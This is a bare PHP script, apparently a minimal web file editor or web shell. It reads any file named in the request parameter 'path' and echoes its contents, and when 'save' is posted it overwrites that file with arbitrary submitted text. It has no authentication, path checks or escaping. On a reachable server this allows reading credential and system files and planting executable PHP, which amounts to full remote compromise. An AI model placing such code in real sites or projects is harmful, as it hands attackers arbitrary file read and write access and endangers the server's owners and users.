<?php 
$data = "";
$show = false;

if(!empty($_POST["save"])){
    $myfile = fopen($_REQUEST['path'], "w") or die("Unable to open file!");
    $txt = $_POST['text'];
    fwrite($myfile, $txt);
    fclose($myfile);
}
if(isset($_REQUEST['path'])){
    $data = file_get_contents($_REQUEST['path']);
    true;
}
echo $data;